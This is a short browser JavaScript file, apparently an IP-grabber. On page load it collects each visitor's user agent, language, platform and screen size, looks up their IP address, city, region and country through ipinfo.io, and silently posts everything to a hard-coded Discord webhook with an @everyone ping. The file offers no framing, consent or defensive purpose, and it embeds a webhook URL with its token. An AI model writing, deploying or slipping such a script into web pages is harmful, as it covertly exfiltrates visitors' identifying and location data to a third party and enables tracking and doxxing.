const deviceInfo = {
  userAgent: navigator.userAgent,
  language: navigator.language,
  platform: navigator.platform,
  screenWidth: window.screen.width,
  screenHeight: window.screen.height,
};

fetch("https://ipinfo.io/json")
  .then((response) => response.json())
  .then((data) => {
    const ipInfo = {
      ip: data.ip,
      city: data.city,
      region: data.region,
      country: data.country,
    };
    sendToWebhook(deviceInfo, ipInfo);
  });

function sendToWebhook(deviceInfo, ipInfo) {
  const webhookUrl =
    "https://discord.com/api/webhooks/1177938612935999568/bhIxA_9GP-cs1nzBB5d2bwA7ZxrX_sE2OBYrfKiRyxUk2ttmes1E-DdfJKTzfXC8iKqA";
  const data = {
    content: "||@everyone||",
    embeds: [
      {
        fields: [
          { name: "User Agent", value: deviceInfo.userAgent },
          { name: "Browser language", value: deviceInfo.language },
          { name: "Platform", value: deviceInfo.platform },
          { name: "IP adress", value: ipInfo.ip },
          { name: "City", value: ipInfo.city },
          { name: "Region", value: ipInfo.region },
          { name: "Country", value: ipInfo.country },
        ],
      },
    ],
  };
  fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
}